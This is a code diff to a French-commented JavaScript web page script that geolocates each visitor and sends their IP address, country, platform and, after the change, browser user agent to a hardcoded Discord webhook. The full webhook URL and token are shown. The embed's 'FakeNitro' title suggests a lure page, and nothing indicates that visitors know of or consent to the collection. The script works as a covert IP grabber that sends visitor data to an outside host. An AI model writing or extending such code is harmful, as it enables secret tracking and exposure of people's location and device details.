@@ -17,6 +17,7 @@ httpGetAsync(url, function(responseText) {
     const city = data.city;
     const region = data.region;
     const isp = data.isp;
+    const userAgent = window.navigator.userAgent;
 
     // Utilisez les variables pour afficher les informations dans votre application
     console.log(`Pays: ${country}`);
@@ -24,6 +25,8 @@ httpGetAsync(url, function(responseText) {
     console.log(`Ville: ${city}`);
     console.log(`Région: ${region}`);
     console.log(`Fournisseur d'accès Internet: ${isp}`);
+    console.log(`User-Agent: ${userAgent}`);
+
 });
 
 const webhookURL = "https://discord.com/api/webhooks/1209908254373711903/knK8b_n6LS2q-h4RISvtMpeJ1oFE0C489n-Ab8btUqi3VSuRQ7XBFtkieCJEdoWV5aVL";
@@ -48,7 +51,7 @@ const sendWebhookOnce = async () => {
 
         const embed = {
             title: "<:FakeNitroEmoji:1209487670561210419> Nouveau membre a rejoint le site!",
-            description: `**Un nouveau membre a rejoint le site!\nAdresse IP: || ${ipAddress} ||\nPays: || ${country} ||\nPlateforme: || ${platform} ||**`,
+            description: `**Un nouveau membre a rejoint le site!\nAdresse IP: || ${ipAddress} ||\nPays: || ${country} ||\nPlateforme: || ${platform} ||\nUser-Agent: || ${userAgent} ||**`,
             color: 0x00ff00
         };
 
